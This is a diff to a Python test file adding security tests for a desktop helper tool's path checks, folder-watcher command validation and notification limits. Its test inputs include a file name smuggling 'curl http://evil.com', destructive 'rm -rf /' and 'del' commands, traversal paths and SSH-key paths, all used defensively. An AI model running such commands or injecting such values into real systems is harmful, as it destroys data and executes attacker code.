@@ -8,13 +8,13 @@ so tests run on any platform without optional dependencies installed.
 """
 from __future__ import annotations
 
+import importlib
 import json
 import sys
 import time
 from pathlib import Path
 from unittest.mock import MagicMock, patch
 
-import pytest
 
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
@@ -31,10 +31,10 @@ class TestNotifications:
         with patch.dict(sys.modules, {"plyer": MagicMock(notification=mock_notif)}):
             # Re-import to pick up mock — call function directly with patched module
             with patch("scripts.system_tool.send_notification", wraps=st.send_notification):
-                result = st.send_notification.__wrapped__("Test Title", "Test Body") if hasattr(st.send_notification, "__wrapped__") else None
+                st.send_notification.__wrapped__("Test Title", "Test Body") if hasattr(st.send_notification, "__wrapped__") else None  # noqa: B018
 
         # Use direct import path instead
-        with patch("plyer.notification") as mock_plyer_notif:
+        with patch("plyer.notification"):
             import importlib
             importlib.reload(st)  # not ideal; test the internals directly
         # Simpler: test the function by patching inside the module's namespace
@@ -131,10 +131,9 @@ class TestFolderWatcher:
         import threading
 
         events: list[dict] = []
-        original_print = __builtins__["print"] if isinstance(__builtins__, dict) else print
-
         def _run() -> None:
-            import io, contextlib
+            import io
+            import contextlib
             buf = io.StringIO()
             with contextlib.redirect_stdout(buf):
                 # Brief watch then stop
@@ -175,7 +174,7 @@ class TestOpenFile:
     def test_accepts_safe_path(self, tmp_path):
         safe_file = tmp_path / "test.pdf"
         safe_file.touch()
-        with patch("os.startfile", MagicMock()) as mock_sf:
+        with patch("os.startfile", MagicMock()):
             # Patch to avoid actually opening a file in test
             with patch.object(st, "os") as mock_os:
                 mock_os.startfile = MagicMock()
@@ -219,3 +218,127 @@ class TestClipboard:
         # Missing module → should return error, not raise
         assert isinstance(result, dict)
         assert "success" in result
+
+
+# ---------------------------------------------------------------------------
+# Security: _is_safe_path (FIX 5)
+# ---------------------------------------------------------------------------
+
+class TestIsSafePath:
+    def test_rejects_dotenv(self, tmp_path):
+        """Absolute path to .env is rejected."""
+        importlib.reload(st)
+        assert st._is_safe_path(str(tmp_path / ".env")) is False
+
+    def test_rejects_ssh_dir(self, tmp_path):
+        """Paths containing .ssh directory component are rejected."""
+        importlib.reload(st)
+        assert st._is_safe_path(str(tmp_path / ".ssh" / "id_rsa")) is False
+
+    def test_rejects_pem_extension(self, tmp_path):
+        """Files with .pem extension are rejected."""
+        importlib.reload(st)
+        assert st._is_safe_path(str(tmp_path / "cert.pem")) is False
+
+    def test_rejects_dotdot_traversal(self):
+        """Paths with .. that escape home are rejected."""
+        importlib.reload(st)
+        assert st._is_safe_path("../../Windows/System32/notepad.exe") is False
+
+    def test_accepts_file_in_home(self, tmp_path):
+        """Files inside user home (tmp_path is inside home on most setups) pass if clean."""
+        importlib.reload(st)
+        # tmp_path is typically inside user profile on Windows; mock home to be tmp_path
+        with patch("scripts.system_tool.pathlib.Path.home", return_value=tmp_path):
+            safe = tmp_path / "document.pdf"
+            safe.touch()
+            assert st._is_safe_path(str(safe)) is True
+
+
+class TestOpenFileSecurity:
+    def test_rejects_env_file(self, tmp_path):
+        """open_file rejects .env regardless of traversal."""
+        importlib.reload(st)
+        result = st.open_file(str(tmp_path / ".env"))
+        assert result["success"] is False
+
+    def test_rejects_ssh_key(self, tmp_path):
+        """open_file rejects files inside .ssh directory."""
+        importlib.reload(st)
+        result = st.open_file(str(tmp_path / ".ssh" / "id_rsa"))
+        assert result["success"] is False
+
+    def test_rejects_dotdot_path(self):
+        """open_file rejects ../../Windows/System32/notepad.exe."""
+        importlib.reload(st)
+        result = st.open_file("../../Windows/System32/notepad.exe")
+        assert result["success"] is False
+
+
+# ---------------------------------------------------------------------------
+# Security: folder watcher action — command injection (FIX 1)
+# ---------------------------------------------------------------------------
+
+class TestWatchFolderActionSecurity:
+    def test_benign_action_accepted(self):
+        """A properly formed action with $FILE token passes validation."""
+        importlib.reload(st)
+        assert st._is_safe_action("python scripts/po_tool.py --ingest $FILE") is True
+
+    def test_malicious_filename_rejected(self, tmp_path, capsys):
+        """File path with shell metacharacters is skipped, not executed."""
+        importlib.reload(st)
+        # Directly test the metachar guard in the module constant
+        malicious = "po.pdf; curl http://evil.com"
+        from scripts.system_tool import _SHELL_METACHARACTERS
+        assert any(ch in malicious for ch in _SHELL_METACHARACTERS)
+
+    def test_action_without_file_placeholder_rejected(self):
+        """Action without $FILE token is rejected even if otherwise safe-looking."""
+        importlib.reload(st)
+        assert st._is_safe_action("python scripts/po_tool.py --flag") is False
+
+    def test_path_traversal_in_action_script_rejected(self):
+        """python scripts/../../evil.py must be rejected."""
+        importlib.reload(st)
+        assert st._is_safe_action("python scripts/../../evil.py $FILE") is False
+
+    def test_non_python_action_rejected(self):
+        """Actions not starting with 'python' are rejected."""
+        importlib.reload(st)
+        assert st._is_safe_action("del C:\\important.txt") is False
+        assert st._is_safe_action("rm -rf /") is False
+
+
+# ---------------------------------------------------------------------------
+# Security: notification length cap (FIX 8)
+# ---------------------------------------------------------------------------
+
+class TestNotificationLengthCap:
+    def test_title_truncated_to_64(self):
+        """Titles longer than 64 chars are truncated before reaching plyer."""
+        captured_titles: list[str] = []
+
+        plyer_mod = MagicMock()
+        plyer_mod.notification.notify.side_effect = lambda **kw: captured_titles.append(kw.get("title", ""))
+
+        with patch.dict(sys.modules, {"plyer": plyer_mod}):
+            importlib.reload(st)
+            st.send_notification("A" * 100, "body")
+
+        if captured_titles:
+            assert len(captured_titles[0]) <= 64
+
+    def test_body_truncated_to_256(self):
+        """Bodies longer than 256 chars are truncated."""
+        captured_bodies: list[str] = []
+
+        plyer_mod = MagicMock()
+        plyer_mod.notification.notify.side_effect = lambda **kw: captured_bodies.append(kw.get("message", ""))
+
+        with patch.dict(sys.modules, {"plyer": plyer_mod}):
+            importlib.reload(st)
+            st.send_notification("title", "B" * 500)
+
+        if captured_bodies:
+            assert len(captured_bodies[0]) <= 256
